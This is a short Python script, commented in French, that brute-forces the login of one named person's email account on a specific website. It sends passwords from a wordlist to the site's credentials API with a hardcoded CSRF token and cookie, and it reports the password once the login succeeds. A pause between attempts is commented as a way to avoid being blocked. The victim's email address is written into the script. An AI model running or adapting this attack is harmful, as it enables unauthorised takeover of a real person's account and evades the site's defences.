#!/usr/bin/env python3
import requests
import time

def test_password(email, password, csrf_token):
    url = "https://www.drhead.org/api/auth/callback/credentials"
    
    headers = {
        "Cookie": f"__Host-next-auth.csrf-token={csrf_token}%7C808594fda7a7a277d66db18b63d410a87f26c484146fce93578ee50eb382d239; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.drhead.org",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Origin": "https://www.drhead.org",
        "Referer": "https://www.drhead.org/login"
    }
    
    data = {
        "email": email,
        "password": password,
        "redirect": "false",
        "csrfToken": csrf_token,
        "callbackUrl": "https://www.drhead.org/login",
        "json": "true"
    }
    
    response = requests.post(url, headers=headers, data=data)
    
    print(f"Testing password: {password} - Status code: {response.status_code}")
    
    # Vérifier si la réponse contient "error"
    if "error" in response.text:
        return False
    else:
        return True

# Paramètres
email = "theo.morio@gmail.com"
csrf_token = "0a9c97c4563f8089fa593650002589ddb5cf75e868c5847363bc95e3ac9033a5"
passwords_file = "passwords3.txt"

# Lire les mots de passe depuis le fichier
with open(passwords_file, "r") as f:
    passwords = [line.strip() for line in f]

# Tester chaque mot de passe
for password in passwords:
    if test_password(email, password, csrf_token):
        print(f"\n[+] Mot de passe trouvé: {password}\n")
        break
    time.sleep(1)  # Pause pour éviter d'être bloqué